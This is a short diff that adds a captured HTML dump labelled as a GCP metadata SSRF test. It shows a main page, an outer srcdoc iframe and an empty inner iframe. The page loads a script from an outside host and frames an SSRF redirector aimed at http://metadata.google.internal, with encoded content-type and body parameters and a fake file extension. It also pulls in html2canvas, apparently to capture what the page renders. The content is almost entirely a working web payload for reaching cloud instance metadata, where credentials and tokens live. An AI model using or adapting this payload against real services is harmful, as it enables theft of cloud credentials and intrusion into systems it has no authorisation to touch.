@@ -1,0 +1,15 @@
+--- MAIN PAGE HTML ---
+<!DOCTYPE html><html><head>
+  <title>GCP Metadata SSRF Test Iframe</title>
+</head>
+<body>
+  <iframe srcdoc="<script src=&quot;https://donreddy.vercel.app&quot;></script><iframe src=&quot;https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&amp;content-type=YXBwbGljYXRpb24vanNvbg==&amp;body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&amp;fakext=/j.json&quot; title=&quot;GCP SSRF Test&quot; width=&quot;50%&quot; height=&quot;50%&quot;></iframe>"></iframe>
+
+
+</body></html>
+
+--- OUTER IFRAME (SRCDOC) DOCUMENT HTML ---
+<html><head><script src="https://donreddy.vercel.app"></script><script type="text/javascript" async="" src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"></script></head><body><iframe src="https://ssrf.localdomain.pw/custom-200/?url=http%3A%2F%2Fmetadata.google.internal&amp;content-type=YXBwbGljYXRpb24vanNvbg==&amp;body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&amp;fakext=/j.json" title="GCP SSRF Test" width="50%" height="50%"></iframe></body></html>
+
+--- INNER IFRAME (GCP SSRF Test) DOCUMENT HTML ---
+<html><head></head><body></body></html>
